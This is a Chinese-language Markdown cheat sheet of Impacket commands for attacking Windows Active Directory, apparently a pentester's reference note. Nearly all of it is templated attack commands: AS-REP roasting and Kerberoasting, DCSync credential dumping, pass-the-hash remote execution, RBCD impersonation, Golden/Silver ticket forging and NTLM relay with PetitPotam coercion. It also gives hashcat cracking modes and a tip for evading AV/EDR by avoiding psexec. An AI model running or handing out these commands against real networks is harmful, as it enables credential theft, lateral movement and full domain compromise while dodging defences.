---
os: linux
service: AD
syntax: impacket-secretsdump -dc-ip <DC> -just-dc <DOMAIN>/<USER>:<PASS>
tags:
  - cmd
---

# impacket 常用脚本速查

> Kali 2024+ 脚本已改名 `impacket-xxx`（如 `impacket-secretsdump`），旧名 `secretsdump.py` 仍指向同一程序。

| 脚本 | 用途 | 典型命令 |
| --- | --- | --- |
| GetNPUsers.py | AS-REP Roasting（抓无预认证用户的 TGT） | `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC> -no-pass` |
| GetUserSPNs.py | Kerberoasting（抓 SPN 账户的 TGS） | `impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request` |
| secretsdump.py | dump 凭据 / DCSync / 本地 SAM | `impacket-secretsdump -dc-ip <DC> -just-dc <DOMAIN>/<USER>:<PASS>` |
| psexec.py | 远程执行（ADMIN$ 服务） | `impacket-psexec -hashes :<NTHASH> <DOMAIN>/<USER>@<DC>` |
| smbexec.py | 远程执行（SMB 半交互） | `impacket-smbexec <DOMAIN>/<USER>:<PASS>@<DC>` |
| wmiexec.py | 远程执行（WMI） | `impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<DC>` |
| atexec.py | 远程执行（计划任务） | `impacket-atexec <DOMAIN>/<USER>:<PASS>@<DC> whoami` |
| mssqlclient.py | 连接 MSSQL | `impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<DC> -windows-auth` |
| GetADUsers.py | 枚举域用户 | `impacket-GetADUsers -all <DOMAIN>/<USER>:<PASS> -dc-ip <DC>` |
| lookupsid.py | SID 枚举用户（RID 爆破） | `impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC>` |
| addcomputer.py | 添加机器账户（RBCD 用） | `impacket-addcomputer -computer-name ATK$ -computer-pass Pass123! -dc-ip <DC> <DOMAIN>/<USER>:<PASS>` |
| getST.py | 请求服务票据（S4U/委派/RBCD） | `impacket-getST -dc-ip <DC> -spn <SPN> -impersonate <ADMIN> <DOMAIN>/<USER>:<PASS>` |
| ticketer.py | 伪造票据（Golden/Silver Ticket） | `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator` |
| changepasswd.py | 改密码（需 ForceChangePassword） | `impacket-changepasswd <DOMAIN>/<USER>:<PASS>@<DC> -newpass <NEWPASS>` |
| ntlmrelayx.py | NTLM relay / 强制认证收割 | `impacket-ntlmrelayx -tf targets.txt -smb2support` |

## 常用组合
- AS-REP → `hashcat -m 18200`；Kerberoast → `hashcat -m 13100`
- secretsdump 拿 hash → psexec/wmiexec `-hashes` 横向
- addcomputer + getST → RBCD 拿 Administrator 票据
- ntlmrelayx + PetitPotam → 强制认证收割

## 常见坑
- `-hashes :<NTHASH>` 冒号前留空表示只给 NT hash（无 LM）
- 用了票据登录要 `export KRB5CCNAME=xxx.ccache` 再配合 `-k -no-pass`
- psexec 会被 AV/EDR 拦，优先 wmiexec 或 smbexec

## 参考开源项目
- impacket (https://github.com/fortra/impacket)
